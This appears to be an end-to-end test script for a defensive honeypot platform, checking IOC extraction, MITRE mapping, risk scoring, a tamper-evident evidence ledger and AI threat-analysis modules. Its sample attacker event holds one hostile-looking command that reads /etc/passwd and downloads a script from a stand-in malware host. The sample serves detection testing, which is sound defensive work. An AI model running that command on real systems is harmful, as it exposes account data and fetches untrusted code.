import sys
import asyncio
import json

if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from app.config import settings
from app.database import connect_to_mongo, close_mongo_connection, get_events_col, get_sessions_col, get_blockchain_col
from app.engines import IOCEngine, RiskEngine, FingerprintEngine, MitreEngine
from app.blockchain import BlockchainEvidenceLedger, calculate_event_hash
from app.ai_engine import AIEngine
from app.routes import router


async def run_tests():
    print("=" * 60)
    print("KURUKSHETRA AI - END-TO-END PLATFORM VERIFICATION")
    print("=" * 60)

    # 1. Database Connection
    print("\n[1] Testing Database Connection...")
    await connect_to_mongo()
    print("✓ MongoDB Connected & Indexes Initialized")

    # 2. Ingest Sample Honeypot Event
    print("\n[2] Testing Telemetry Ingestion & Deterministic Engines...")
    test_event = {
        "event_id": "EVT-TEST-E2E-001",
        "session_id": "ATK-TEST-E2E-SESSION",
        "source_ip": "185.220.101.5",
        "target_ip": "10.0.0.100",
        "service": "ssh",
        "timestamp": "2026-09-12T00:00:00Z",
        "event_type": "command",
        "event": "cat /etc/passwd && wget http://malware.xyz/x.sh",
        "metadata": {"cwd": "/root"}
    }

    # IOC Extraction
    iocs = IOCEngine.extract_iocs(test_event)
    print(f"✓ IOC Extraction: {len(iocs)} IOCs found: {[i['value'] for i in iocs]}")
    assert any(i["value"] == "185.220.101.5" for i in iocs)

    # MITRE Mapping
    mitre = MitreEngine.map_event(test_event)
    print(f"✓ MITRE Mapping: {len(mitre)} techniques mapped: {[m['technique_id'] for m in mitre]}")

    # Risk Engine
    risk_delta, factors = RiskEngine.calculate_event_risk(test_event)
    print(f"✓ Risk Scoring: Delta = {risk_delta}, Factors = {factors}")

    # Fingerprint DNA
    fingerprint, tactics = FingerprintEngine.generate_fingerprint("ssh", [test_event])
    print(f"✓ Attacker DNA Fingerprint: {fingerprint}")

    # 3. Blockchain Evidence Ledger
    print("\n[3] Testing Blockchain Evidence Ledger (Tamper-Evident SHA-256)...")
    ev_col = get_events_col()
    await ev_col.update_one({"event_id": test_event["event_id"]}, {"$set": test_event}, upsert=True)
    
    evidence_block = await BlockchainEvidenceLedger.record_event_evidence(test_event)
    print(f"✓ Block Registered: #{evidence_block['block_index']} [{evidence_block['evidence_id']}]")
    print(f"  Event Hash: {evidence_block['event_hash']}")
    print(f"  Block Hash: {evidence_block['block_hash']}")

    # Verify single evidence
    ver_single = await BlockchainEvidenceLedger.verify_evidence(evidence_block["evidence_id"])
    print(f"✓ Single Verification Status: {ver_single['status']} ({ver_single['message']})")
    assert ver_single["status"] == "VERIFIED"

    # Verify whole chain
    chain_ver = await BlockchainEvidenceLedger.verify_chain()
    print(f"✓ Chain Status: {chain_ver['chain_status']}, Blocks: {chain_ver['total_evidence_blocks']}, Alerts: {chain_ver['integrity_alerts']}")
    assert chain_ver["chain_status"] == "VALID"

    # 4. Safe Controlled Tamper Demonstration
    print("\n[4] Testing Controlled Tamper Demonstration...")
    tamper_res = await BlockchainEvidenceLedger.tamper_demo_record()
    print(f"✓ Tamper Result: Status = {tamper_res['verification_result']['status']}")
    assert tamper_res['verification_result']['status'] == "TAMPER_DETECTED"
    print(f"  Database Hash:   {tamper_res['verification_result']['database_hash']}")
    print(f"  Blockchain Hash: {tamper_res['verification_result']['blockchain_hash']}")

    # Restore demo record
    restore_res = await BlockchainEvidenceLedger.restore_demo_record()
    print(f"✓ Restore Result: Status = {restore_res['verification_result']['status']}")
    assert restore_res['verification_result']['status'] == "VERIFIED"

    # 5. AI Threat Analyst Module
    print("\n[5] Testing AI Threat Analyst (Groq / Heuristic Provider Abstraction)...")
    ai_analysis = await AIEngine.analyze_threat(
        session={"session_id": "ATK-TEST-E2E-SESSION", "source_ip": "185.220.101.5", "service": "ssh", "risk_breakdown": ["Account discovery"]},
        events=[test_event],
        risk_score=75,
        risk_level="HIGH",
        iocs=iocs,
        mitre_mappings=mitre,
        fingerprint=fingerprint,
        evidence_integrity="VERIFIED"
    )
    print("✓ AI Threat Analysis Produced:")
    print(f"  Threat Summary: {ai_analysis.get('threat_summary')}")
    print(f"  Observed Behavior: {ai_analysis.get('observed_behavior')}")
    print(f"  AI Interpretation: {ai_analysis.get('ai_interpretation')}")
    print(f"  Likely Objective: {ai_analysis.get('likely_objective')}")
    print(f"  Recommended Actions: {ai_analysis.get('recommended_actions')}")

    # 6. AI Event Explanation
    print("\n[6] Testing Event Explanation with AI...")
    explanation = await AIEngine.explain_event(test_event)
    print(f"✓ Observed: {explanation['observed_behavior']}")
    print(f"✓ Interpretation: {explanation['ai_interpretation']}")

    # 7. AI Vulnerability Guard
    print("\n[7] Testing AI Vulnerability Guard...")
    vuln_items = await AIEngine.analyze_vulnerability_guard([test_event], iocs)
    print(f"✓ Vulnerability Exposures Identified: {len(vuln_items)}")
    for v in vuln_items:
        print(f"  - [{v['risk_severity']}] {v['target_interest']} -> {v['defensive_recommendation']}")

    print("\n" + "=" * 60)
    print("ALL TESTS PASSED WITH 100% SUCCESS!")
    print("=" * 60)

    # Cleanup test event
    await ev_col.delete_one({"event_id": "EVT-TEST-E2E-001"})
    await close_mongo_connection()


if __name__ == "__main__":
    asyncio.run(run_tests())
